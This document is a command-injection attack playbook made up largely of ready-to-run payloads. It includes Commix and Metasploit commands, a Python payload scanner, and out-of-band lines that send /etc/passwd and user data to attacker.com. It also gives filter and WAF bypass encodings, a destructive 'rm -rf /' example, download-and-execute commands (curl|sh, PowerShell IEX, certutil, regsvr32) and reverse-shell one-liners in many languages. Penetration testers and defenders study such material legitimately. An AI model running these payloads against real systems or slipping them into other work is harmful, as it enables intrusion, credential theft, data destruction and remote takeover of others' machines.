# Command Injection Playbook

## Indicators

Signs this vulnerability may be present:
- Application executes system commands based on user input
- File operations (upload, download, convert, compress)
- Network utilities (ping, traceroute, nslookup, dig)
- System administration functions (process management, service control)
- PDF generation, image processing, or document conversion
- Parameters containing filenames, hostnames, or IP addresses
- Error messages revealing shell command syntax or output
- Application built in languages prone to shell execution (PHP, Python, Perl, Ruby)

## Tools

### Commix

```bash
# Basic URL scan
commix -u "http://target.com/page?ip=127.0.0.1"

# POST request
commix -u "http://target.com/ping" --data="host=127.0.0.1"

# With cookies
commix -u "http://target.com/page?ip=127.0.0.1" --cookie="session=abc123"

# Specify injection technique
commix -u "http://target.com/page?ip=127.0.0.1" --technique=T  # Time-based
commix -u "http://target.com/page?ip=127.0.0.1" --technique=F  # File-based
commix -u "http://target.com/page?ip=127.0.0.1" --technique=C  # Classic

# OS shell
commix -u "http://target.com/page?ip=127.0.0.1" --os-cmd="whoami"

# Reverse shell
commix -u "http://target.com/page?ip=127.0.0.1" --reverse-shell --lhost=attacker.com --lport=4444

# Specify OS
commix -u "http://target.com/page?ip=127.0.0.1" --os=unix
commix -u "http://target.com/page?ip=127.0.0.1" --os=windows

# Increase level and risk
commix -u "http://target.com/page?ip=127.0.0.1" --level=3

# Tamper scripts for evasion
commix -u "http://target.com/page?ip=127.0.0.1" --tamper=base64encode

# Skip specific checks
commix -u "http://target.com/page?ip=127.0.0.1" --skip-empty

# Output to file
commix -u "http://target.com/page?ip=127.0.0.1" -o results.txt

# From Burp request file
commix -r request.txt
```

### Manual Testing

```bash
# Basic command injection tests
curl "http://target.com/ping?host=127.0.0.1;id"
curl "http://target.com/ping?host=127.0.0.1|id"
curl "http://target.com/ping?host=127.0.0.1||id"
curl "http://target.com/ping?host=127.0.0.1&&id"
curl "http://target.com/ping?host=\`id\`"
curl "http://target.com/ping?host=\$(id)"

# URL encoded payloads
curl "http://target.com/ping?host=127.0.0.1%3Bid"
curl "http://target.com/ping?host=127.0.0.1%7Cid"
curl "http://target.com/ping?host=127.0.0.1%26%26id"

# Newline injection
curl "http://target.com/ping?host=127.0.0.1%0aid"
curl "http://target.com/ping?host=127.0.0.1%0d%0aid"

# POST request injection
curl -X POST "http://target.com/ping" -d "host=127.0.0.1;id"

# JSON body injection
curl -X POST "http://target.com/api/ping" \
     -H "Content-Type: application/json" \
     -d '{"host":"127.0.0.1;id"}'

# Header injection
curl "http://target.com/page" -H "X-Forwarded-For: 127.0.0.1;id"

# Time-based blind detection
curl "http://target.com/ping?host=127.0.0.1;sleep+5"
curl "http://target.com/ping?host=127.0.0.1|sleep+5"
curl "http://target.com/ping?host=127.0.0.1%26%26sleep+5"

# Windows time-based
curl "http://target.com/ping?host=127.0.0.1&ping+-n+5+127.0.0.1"
curl "http://target.com/ping?host=127.0.0.1|timeout+/t+5"
```

### Python Script for Command Injection Testing

```python
#!/usr/bin/env python3
import requests
import time
import sys
from urllib.parse import quote

# Unix payloads
unix_payloads = [
    "; id",
    "| id",
    "|| id",
    "&& id",
    "& id",
    "`id`",
    "$(id)",
    "\nid",
    "\r\nid",
    "; id #",
    "| id #",
    "'; id #",
    "\"; id #",
]

# Windows payloads
windows_payloads = [
    "& whoami",
    "| whoami",
    "|| whoami",
    "&& whoami",
    "\r\nwhoami",
    "| cmd /c whoami",
]

# Time-based payloads
time_payloads = [
    ("; sleep 5", 5),
    ("| sleep 5", 5),
    ("|| sleep 5", 5),
    ("&& sleep 5", 5),
    ("$(sleep 5)", 5),
    ("`sleep 5`", 5),
]

def test_injection(url, param, payloads):
    for payload in payloads:
        test_url = f"{url}?{param}=127.0.0.1{quote(payload)}"
        try:
            response = requests.get(test_url, timeout=10)
            print(f"[*] Testing: {payload}")
            if any(indicator in response.text.lower() for indicator in ['uid=', 'gid=', 'groups=']):
                print(f"[+] VULNERABLE! Payload: {payload}")
                print(f"    Response snippet: {response.text[:200]}")
        except Exception as e:
            print(f"[-] Error: {e}")

def test_time_based(url, param, payloads):
    for payload, delay in payloads:
        test_url = f"{url}?{param}=127.0.0.1{quote(payload)}"
        try:
            start = time.time()
            response = requests.get(test_url, timeout=delay + 5)
            elapsed = time.time() - start

            print(f"[*] Testing: {payload} (expected delay: {delay}s, actual: {elapsed:.2f}s)")
            if elapsed >= delay - 1:
                print(f"[+] POTENTIALLY VULNERABLE (time-based)! Payload: {payload}")
        except requests.exceptions.Timeout:
            print(f"[+] POTENTIALLY VULNERABLE (timeout)! Payload: {payload}")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    url = "http://target.com/ping"
    param = "host"

    print("[*] Testing Unix payloads...")
    test_injection(url, param, unix_payloads)

    print("\n[*] Testing time-based payloads...")
    test_time_based(url, param, time_payloads)
```

### Metasploit Modules

```bash
# Generic command injection
use exploit/multi/http/generic_cmd_injection
set RHOSTS target.com
set TARGETURI /ping
set CMD_PARAM host
set CMD id
run

# PHP command injection
use exploit/unix/webapp/php_exec
set RHOSTS target.com
set TARGETURI /vulnerable.php
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST attacker.com
run

# Web delivery for command injection
use exploit/multi/script/web_delivery
set TARGET 2  # PSH (PowerShell)
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker.com
set SRVPORT 8080
run
# Then inject the generated command

# Apache Struts command injection
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS target.com
set TARGETURI /struts2-showcase/showcase.action
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST attacker.com
run

# Shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target.com
set TARGETURI /cgi-bin/vulnerable.cgi
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST attacker.com
run

# Jenkins Groovy script console
use exploit/multi/http/jenkins_script_console
set RHOSTS target.com
set TARGETURI /script
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST attacker.com
run
```

## Techniques

### 1. Direct Injection

Command is directly concatenated and executed.

```bash
# Unix separators
; command           # Execute after previous (always executes)
| command           # Pipe output to command (always executes)
|| command          # Execute if previous fails (OR)
&& command          # Execute if previous succeeds (AND)
& command           # Background execution (always executes)

# Command substitution
`command`           # Backtick substitution
$(command)          # Dollar-paren substitution

# Newline injection
%0a command         # URL-encoded newline
%0d%0a command      # URL-encoded CRLF

# Examples
# Ping utility injection
127.0.0.1; cat /etc/passwd
127.0.0.1 | cat /etc/passwd
127.0.0.1 && cat /etc/passwd

# Filename injection
file.txt; rm -rf /
file.txt | cat /etc/shadow
file.txt`id`

# Windows separators
& command           # Execute after previous
| command           # Pipe output
|| command          # Execute if previous fails
&& command          # Execute if previous succeeds
```

### 2. Blind Injection (Time-Based)

No output visible, infer execution from response timing.

```bash
# Unix time-based
; sleep 10
| sleep 10
&& sleep 10
|| sleep 10
`sleep 10`
$(sleep 10)

# Using ping for delay
; ping -c 10 127.0.0.1
| ping -c 10 127.0.0.1

# Windows time-based
& ping -n 10 127.0.0.1
| ping -n 10 127.0.0.1
& timeout /t 10
| timeout /t 10

# Data exfiltration via timing
# Extract character by character based on response time
; if [ $(whoami | cut -c1) = "r" ]; then sleep 5; fi
```

### 3. Blind Injection (Out-of-Band)

Exfiltrate data through DNS or HTTP callbacks.

```bash
# DNS exfiltration (Unix)
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
; host $(whoami).attacker.com
| nslookup `id | base64`.attacker.com

# DNS exfiltration (Windows)
& nslookup %USERNAME%.attacker.com
| nslookup %COMPUTERNAME%.attacker.com

# HTTP exfiltration
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
| curl http://attacker.com/$(id | base64)

# HTTP exfiltration (Windows)
& powershell -c "Invoke-WebRequest http://attacker.com/?data=$env:USERNAME"
| certutil -urlcache -f http://attacker.com/?data=%USERNAME%

# Using xxd for binary data
; xxd /etc/passwd | curl -X POST -d @- http://attacker.com/
```

### 4. Argument Injection

Inject arguments to existing commands rather than new commands.

```bash
# Git argument injection
--upload-pack='touch /tmp/pwned'
--exec='id>/tmp/out'

# Tar argument injection
--checkpoint=1 --checkpoint-action=exec=id

# Find argument injection
-exec id \;

# Curl argument injection
-o /var/www/html/shell.php http://attacker.com/shell.txt

# Wget argument injection
-O /var/www/html/shell.php http://attacker.com/shell.txt

# Rsync argument injection
-e 'sh -c id' rsync://attacker.com/

# SSH argument injection
-o ProxyCommand='id'
```

## Bypass Techniques

### Space Bypass

```bash
# Using $IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}

# Using tabs
cat%09/etc/passwd

# Using brace expansion
{cat,/etc/passwd}
{ls,-la,/}

# Using environment variables
X=$'\x20';cat${X}/etc/passwd

# Using < redirection
cat</etc/passwd

# Windows: using environment variable
set x= & cmd /c dir%x%c:\
```

### Character Restrictions

```bash
# No slashes - use environment variable
echo ${HOME:0:1}etc${HOME:0:1}passwd  # Extracts / from $HOME

# No slashes - use printf
cat $(printf '\x2f')etc$(printf '\x2f')passwd

# Hex encoding
cat $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
bash -c {echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|{bash,-i}

# Octal encoding
cat $'\057etc\057passwd'

# Using wildcards
cat /etc/pass??
cat /etc/p*d
cat /???/p????d
```

### Quote Restrictions

```bash
# Without quotes - concatenation
/bin/cat /etc/passwd

# Using double dollar
cat /etc/pas$$wd  # $$ = PID, but might work

# Using backslash
cat /etc/pas\swd

# Hex without quotes
cat $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
```

### Keyword Blacklist Bypass

```bash
# Command obfuscation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd

# Using variables
a=c;b=at;$a$b /etc/passwd

# Reverse string
$(rev<<<'dwssap/cte/ tac')

# Base64
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Hex in bash
$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'

# Using PATH
$(which cat) /etc/passwd

# Glob patterns
/???/??t /???/p????d
/???/b??/?at /???/p????d
```

### WAF Bypass

```bash
# URL encoding
%3B%20id                    # ; id
%7C%20id                    # | id
%26%26%20id                 # && id

# Double URL encoding
%253B%2520id
%257C%2520id

# Unicode encoding
%u003B%u0020id

# Mixed encoding
;%20id
|%0aid

# Case variation (Windows)
wHoAmI
WhOaMi

# Using null bytes
;%00id
|%00id
```

## Reverse Shell Payloads

### Unix Reverse Shells

```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Netcat reverse shell
nc -e /bin/sh attacker.com 4444
nc -c sh attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl reverse shell
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP reverse shell
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# curl-based shell download and execute
curl http://attacker.com/shell.sh | sh
wget -O - http://attacker.com/shell.sh | sh
```

### Windows Reverse Shells

```powershell
# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell download and execute
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# Certutil download
certutil -urlcache -split -f http://attacker.com/nc.exe nc.exe && nc.exe attacker.com 4444 -e cmd.exe

# Regsvr32
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll

# MSBuild
# Create malicious .csproj file, then:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shell.csproj
```

### Encoded Payloads

```bash
# Base64 encoded bash reverse shell
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx
; echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d | bash

# PowerShell base64 encoded
# Use: echo "command" | iconv -t UTF-16LE | base64 -w0
powershell -enc <base64_encoded_command>
```

## Success Indicators

- Command output visible in response (id, whoami, hostname)
- Response time increases when using sleep/ping commands
- DNS queries received at attacker-controlled DNS server
- HTTP requests received at attacker-controlled web server
- Error messages revealing command execution context
- File created on target system (/tmp/test, etc.)
- Reverse shell connection established
- System information disclosed (OS version, users, processes)
- Ability to read sensitive files (/etc/passwd, /etc/shadow)
- Network connections visible in listener (nc -lvp)
